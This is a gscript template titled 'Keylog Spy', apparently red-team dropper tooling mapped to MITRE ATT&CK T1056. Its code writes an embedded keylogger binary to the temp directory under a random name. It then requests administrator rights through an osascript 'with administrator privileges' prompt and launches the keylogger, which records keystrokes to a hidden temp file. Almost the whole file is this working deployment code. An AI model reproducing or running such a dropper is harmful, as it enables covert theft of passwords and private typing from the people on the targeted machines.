// Example gscript template
// Title: Keylog Spy
// Author: heywoodlh
// Purpose: Prompts for elevation, starts recording keylogs, saves them in /tmp/2468ks
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using: this keylogger https://github.com/GiacomoLaw/Keylogger

//priority:150
//timeout:150

//go_import:os as os
//go_import:os/user as user

//import:resources/keylogger64

function Deploy() {  
    console.log("Starting keylogger");
    // Drop the sample
    var keylogBin = GetAssetAsBytes("keylogger64");
    if (keylogBin[1] != null) {
        console.log("errors: " + keylogBin[1].Error());
    }

    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    var name = naming.toLowerCase();
    name = temppath + "/" + name;
    G.file.WriteFileFromBytes(name, keylogBin[0]);
    console.log("dropped the keylogger binary here: " + name); 


    // Get a random outfile
    var t2 = os.TempDir();
    var n2 = G.rand.GetAlphaString(6);
    n2 = n2.toLowerCase();
    n2 = t2 + "/" + n2;       
    console.log("writing log file here: " + n2); 
    
    // Build osascript
    var command = "do shell script \"" + name + " " + n2 + "\" with administrator privileges";
    
    // Run the command
    var runner = G.exec.ExecuteCommand("osascript", ["-e", command]);
    var runner = G.exec.ExecuteCommandAsync(name, [n2]);
    if (runner[1] != null) {
        console.log("errors: " + runner[1].Error());
    } else {
        console.log("pid: " + runner[0].Process.Pid);
    }

    console.log("Completed keylogger");
    return true;

}
